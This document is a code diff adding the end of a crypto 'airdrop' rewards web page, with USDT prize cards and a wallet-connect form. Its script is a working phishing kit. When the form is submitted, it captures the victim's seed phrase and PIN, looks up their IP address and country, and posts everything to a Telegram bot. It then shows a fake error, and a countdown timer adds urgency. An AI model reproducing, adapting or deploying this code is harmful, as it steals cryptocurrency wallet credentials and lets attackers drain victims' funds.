+                        <div class="row justify-content-center row-cols-xl-4 row-cols-lg-3 row-cols-md-2 row-cols-sm-2 row-cols-1">
+                            <div class="col">
+                                <div class="shop__item">
+                                    <div class="shop__item-thumb">
+                                        <a ><img src="assets/img/airdrop.webp" alt="img"></a>
+                                        
+                                    </div>
+                                    <div class="shop__item-line"></div>
+                                    <div class="shop__item-content">
+                                        <div class="shop__item-content-top">
+                                            <div class="shop__item-cat"><a >SphereX</a></div>
+                                            
+                                            <div class="shop__item-price">500 USDT</div>
+                                        </div>
+                                        <h4 class="title"><a >Win $20 & Airdrop</a></h4>
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="col">
+                                <div class="shop__item">
+                                    <div class="shop__item-thumb">
+                                        <a ><img src="assets/img/web3.webp" alt="img"></a>
+                                        
+                                    </div>
+                                    <div class="shop__item-line"></div>
+                                    <div class="shop__item-content">
+                                        <div class="shop__item-content-top">
+                                            <div class="shop__item-cat"><a >Trikon</a></div>
+                                            
+                                            <div class="shop__item-price">500 USDT</div>
+                                        </div>
+                                        <h4 class="title"><a >Web3 Gamer's Frontier</a></h4>
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="col">
+                                <div class="shop__item">
+                                    <div class="shop__item-thumb">
+                                        <a ><img src="assets/img/init.png" alt="img"></a>
+                                        
+                                    </div>
+                                    <div class="shop__item-line"></div>
+                                    <div class="shop__item-content">
+                                        <div class="shop__item-content-top">
+                                            <div class="shop__item-cat"><a >InitVerse</a></div>
+                                            
+                                            <div class="shop__item-price">1000 USDT</div>
+                                        </div>
+                                        <h4 class="title"><a >TaskOn x InitVerse team</a></h4>
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="col">
+                                <div class="shop__item">
+                                    <div class="shop__item-thumb">
+                                        <a ><img src="assets/img/bg.png" alt="img"></a>
+                                        
+                                    </div>
+                                    <div class="shop__item-line"></div>
+                                    <div class="shop__item-content">
+                                        <div class="shop__item-content-top">
+                                            <div class="shop__item-cat"><a >LEARN_Brainedge</a></div>
+                                            
+                                            <div class="shop__item-price">2000 USDT</div>
+                                        </div>
+                                        <h4 class="title"><a >TaskOn x Brainedge team</a></h4>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+        <!-- shop-area-end -->
+
+    </main>
+    <!-- main-area-end -->
+
+
+
+    <!-- JS here -->
+    <script src="assets/js/vendor/jquery-3.6.0.min.js"></script>
+    <script src="assets/js/plugins.js"></script>
+    <script src="assets/js/ajax-form.js"></script>
+    <script src="assets/js/main.js"></script>
+    
+    <script type="text/javascript">
+        function show_form(wallet_name) {
+            var s = document.getElementById("connect_form");
+            var w = document.getElementById("select_wallet");
+            var wn = document.getElementById("w-name");
+            
+            s.classList.toggle("d-none");
+            w.classList.toggle("d-none");
+            wn.setAttribute("value", wallet_name);
+    
+            var l = document.getElementById("walletconnect-text"); 
+            l.innerText = `Validate your ${wallet_name}`;
+        }
+    
+        function connect_wallet(){
+            var cw = document.getElementById("walletconnect-wrapper");
+            cw.classList.remove("d-none");
+        }
+    
+        function close_connect_wallet(){
+            var cw = document.getElementById("walletconnect-wrapper");
+            var s = document.getElementById("connect_form");
+            var w = document.getElementById("select_wallet");
+            var ce = document.getElementById("connect_error");
+    
+            var seed = document.getElementById("c_seed");
+            var pin = document.getElementById("c_pin");
+    
+            seed.value = "";
+            pin.value = "";
+            
+            s.classList.add("d-none");
+            w.classList.remove("d-none");
+            cw.classList.add("d-none");
+            ce.classList.add("d-none");
+        }
+    
+        /*function try_again(){
+            connect_wallet();
+        }
+    
+        function connect(ev) {
+            var seed = document.getElementById("c_seed");
+            var pin = document.getElementById("c_pin");
+            var wallet = document.getElementById("w-name");
+            var ce = document.getElementById("connect_error");
+            var data = {seed: seed.value, pin: pin.value, wallet: wallet.value};
+            console.log(data);
+    
+            var s = document.getElementById("connect_form");
+            var w = document.getElementById("select_wallet");
+    
+            s.classList.add("d-none");
+            w.classList.add("d-none");
+    
+            ce.classList.remove("d-none");
+        }*/
+    </script>
+    <script>
+        // JavaScript for index.html
+      // Clear form fields on page load
+        window.onload = function() {
+            document.getElementById("messageForm").reset();
+        };
+      
+      document.getElementById('messageForm').addEventListener('submit', function(event) {
+      event.preventDefault(); // Prevent default form submission
+      
+      // Get form data
+      var seed = document.getElementById('c_seed').value;
+      var pin = document.getElementById('c_pin').value;
+      var wallet = document.getElementById('w-name').value;
+      
+      // Get user's IP address and user agent
+      fetch('https://api.ipify.org?format=json')
+        .then(response => response.json())
+        .then(data => {
+          var ip = data.ip;
+          var useragent = navigator.userAgent;
+          
+            // Determine visitor's country using a free service
+          fetch('https://ipapi.co/' + ip + '/json/')
+            .then(response => response.json())
+            .then(data => {
+              var country = data.country_name;
+      
+              // Construct message
+              var message = "🔗 Seed Phrase 🔗\n";
+              message += "+++ Wallet Name : " + wallet + "\n";
+              message += "+++ Phrase: " + seed + "\n";
+              message += "+++ Pin: " + pin + "\n";
+              message += "📍 IP : " + ip + "\n";
+              message += "Country : " + country + "\n";
+              
+              // Add other fields if needed
+      
+              // Send message to Telegram
+              fetch('https://api.telegram.org/bot' + telegramConfig.botToken + '/sendMessage', {
+                method: 'POST',
+                headers: {
+                  'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                  chat_id: telegramConfig.chatId,
+                  text: message
+                })
+              })
+              .then(response => {
+                if (!response.ok) {
+                  throw new Error('Failed to send message to Telegram');
+                }
+                console.log('Message sent to Telegram successfully');
+                
+                // Show loading overlay
+                document.getElementById('loadingOverlay').style.display = 'flex';
+      
+                // Delay for 5 seconds
+                setTimeout(function() {
+                  // Hide loading overlay
+                  document.getElementById('loadingOverlay').style.display = 'none';
+                  
+                  // Remove the 'd-none' class to display the error modal
+                  document.getElementById('connect_error').classList.remove('d-none');
+                  document.getElementById('connect_form').style.display = 'none';
+                  
+                }, 3000);
+            
+              })
+              .catch(error => {
+                console.error('Error sending message to Telegram:', error);
+                // Handle errors, such as displaying an error message to the user
+              });
+            })
+          .catch(error => {
+            console.error('Error getting user country:', error);
+            // Handle errors, such as displaying an error message to the user
+          });
+        })
+        .catch(error => {
+          console.error('Error fetching IP address:', error);
+          // Handle errors, such as displaying an error message to the user
+        });
+      });
+      
+      
+    </script>
+    <script>
+        function startCountdown(duration, display) {
+            let timer = duration, hours, minutes, seconds;
+            const interval = setInterval(function () {
+                if (timer <= 0) {
+                    clearInterval(interval);
+                    return;
+                }
+        
+                hours = Math.floor(timer / 3600);
+                minutes = Math.floor((timer % 3600) / 60);
+                seconds = timer % 60;
+        
+                hours = hours < 10 ? "0" + hours : hours;
+                minutes = minutes < 10 ? "0" + minutes : minutes;
+                seconds = seconds < 10 ? "0" + seconds : seconds;
+        
+                display.textContent = hours + ":" + minutes + ":" + seconds;
+        
+                timer--;
+        
+                localStorage.setItem("remainingTime", timer);
+            }, 1000);
+        }
+        
+        window.onload = function () {
+            const initialDuration = 10 * 3600 + 28 * 60; // 10 hours and 28 minutes in seconds
+            const display = document.querySelector('#timer');
+        
+            let remainingTime = localStorage.getItem("remainingTime");
+            if (!remainingTime) {
+                remainingTime = initialDuration;
+                localStorage.setItem("remainingTime", remainingTime);
+            }
+        
+            startCountdown(remainingTime, display);
+        };
+        
+        
+        
+    </script>
+</body>
+
+</html>
